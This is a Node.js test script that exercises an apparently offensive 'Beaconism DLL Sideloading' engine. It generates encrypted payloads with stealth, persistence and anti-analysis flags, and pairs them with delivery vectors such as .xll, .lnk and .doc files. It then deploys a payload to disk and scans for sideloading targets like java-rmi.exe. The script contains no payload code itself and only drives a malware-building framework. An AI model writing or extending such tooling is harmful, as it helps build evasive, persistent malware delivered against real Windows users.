#!/usr/bin/env node

// Test script for Beaconism DLL Sideloading with Encryption Integration
const BeaconismDLLSideloading = require('./src/engines/beaconism-dll-sideloading');

async function testBeaconismEncryptionIntegration() {
    console.log(' Testing Beaconism DLL Sideloading with Encryption Integration...\n');
    
    try {
        // Initialize the engine
        console.log('1. Initializing Beaconism DLL Sideloading Engine...');
        const beaconismEngine = BeaconismDLLSideloading;
        await beaconismEngine.initialize();
        console.log(' Beaconism DLL Sideloading Engine initialized successfully\n');
        
        // Test encryption methods
        console.log('2. Testing encryption methods...');
        const encryptionMethods = beaconismEngine.encryptionMethods;
        console.log(' Available encryption methods:');
        Object.entries(encryptionMethods).forEach(([method, config]) => {
            console.log(`   - ${method}: ${config.mode} (key: ${config.keySize} bytes, iv: ${config.ivSize} bytes)`);
        });
        console.log('');
        
        // Test payload generation with encryption
        console.log('3. Testing payload generation with encryption...');
        const payloadOptions = {
            target: 'java-rmi.exe',
            payloadType: 'x64',
            encryptionMethod: 'aes256-gcm',
            exploitVector: '.xll',
            stealth: true,
            persistence: true,
            antiAnalysis: true
        };
        
        const payloadResult = await beaconismEngine.generatePayload(payloadOptions);
        console.log(' Payload generation with encryption completed:');
        console.log('   - Payload ID:', payloadResult.payloadId);
        console.log('   - Encryption Method:', payloadResult.encryptionMethod);
        console.log('   - Target:', payloadResult.target);
        console.log('   - Exploit Vector:', payloadResult.exploitVector);
        console.log('   - Stealth Mode:', payloadResult.stealth);
        console.log('   - Persistence:', payloadResult.persistence);
        console.log('   - Anti-Analysis:', payloadResult.antiAnalysis);
        console.log('');
        
        // Test different encryption methods
        console.log('4. Testing different encryption methods...');
        const encryptionMethodsToTest = ['aes256-cbc', 'aes256-gcm', 'chacha20-poly1305', 'rc4', 'xor'];
        
        for (const method of encryptionMethodsToTest) {
            const testPayload = await beaconismEngine.generatePayload({
                target: 'notepad.exe',
                payloadType: 'x86',
                encryptionMethod: method,
                exploitVector: '.lnk',
                stealth: true
            });
            console.log(` ${method} encryption test completed - Payload ID: ${testPayload.payloadId}`);
        }
        console.log('');
        
        // Test exploit vectors with encryption
        console.log('5. Testing exploit vectors with encryption...');
        const exploitVectors = ['.xll', '.lnk', '.doc', '.exe', '.dll'];
        
        for (const vector of exploitVectors) {
            const testPayload = await beaconismEngine.generatePayload({
                target: 'system',
                payloadType: 'x64',
                encryptionMethod: 'aes256-gcm',
                exploitVector: vector,
                stealth: true
            });
            console.log(` ${vector} exploit vector test completed - Payload ID: ${testPayload.payloadId}`);
        }
        console.log('');
        
        // Test payload deployment with encryption
        console.log('6. Testing payload deployment with encryption...');
        const deploymentResult = await beaconismEngine.deployPayload(payloadResult.payloadId, '/tmp/test_payload.xll', {
            encryptionKey: 'test-key-123456789012345678901234567890',
            stealth: true,
            persistence: true
        });
        console.log(' Payload deployment with encryption completed:', deploymentResult);
        console.log('');
        
        // Test payload retrieval
        console.log('7. Testing payload retrieval...');
        const payloads = await beaconismEngine.getPayloads();
        console.log(' Payload retrieval completed:');
        console.log('   - Total payloads:', payloads.payloads.length);
        payloads.payloads.forEach((payload, index) => {
            console.log(`   - Payload ${index + 1}: ${payload.id} (${payload.encryptionMethod})`);
        });
        console.log('');
        
        // Test sideload targets
        console.log('8. Testing sideload targets...');
        const targets = await beaconismEngine.getSideloadTargets();
        console.log(' Sideload targets retrieved:');
        console.log('   - Total targets:', targets.targets.length);
        targets.targets.slice(0, 5).forEach((target, index) => {
            console.log(`   - Target ${index + 1}: ${target.name} (${target.platform})`);
        });
        console.log('');
        
        // Test target scanning
        console.log('9. Testing target scanning...');
        const scanResult = await beaconismEngine.scanTarget('java-rmi.exe');
        console.log(' Target scanning completed:', scanResult);
        console.log('');
        
        // Test encryption key management
        console.log('10. Testing encryption key management...');
        const keyStatus = beaconismEngine.encryptionKeys;
        console.log(' Encryption key management:');
        console.log('   - Keys initialized:', keyStatus.size > 0);
        console.log('   - Available methods:', Array.from(keyStatus.keys()));
        console.log('');
        
        // Test engine status
        console.log('11. Getting engine status...');
        const status = await beaconismEngine.getStatus();
        console.log(' Engine status:', status);
        console.log('');
        
        console.log(' All Beaconism Encryption Integration tests completed successfully!');
        console.log(' Test Summary:');
        console.log('   - Engine Initialization: ');
        console.log('   - Encryption Methods: ');
        console.log('   - Payload Generation: ');
        console.log('   - Multiple Encryption Methods: ');
        console.log('   - Exploit Vectors: ');
        console.log('   - Payload Deployment: ');
        console.log('   - Payload Retrieval: ');
        console.log('   - Sideload Targets: ');
        console.log('   - Target Scanning: ');
        console.log('   - Encryption Key Management: ');
        console.log('   - Engine Status: ');
        console.log('');
        console.log(' Beaconism DLL Sideloading with Encryption Integration is fully functional!');
        
    } catch (error) {
        console.error(' Beaconism Encryption Integration test failed:', error.message);
        console.error('Stack trace:', error.stack);
        process.exit(1);
    }
}

// Run the test
if (require.main === module) {
    testBeaconismEncryptionIntegration().catch(console.error);
}

module.exports = { testBeaconismEncryptionIntegration };
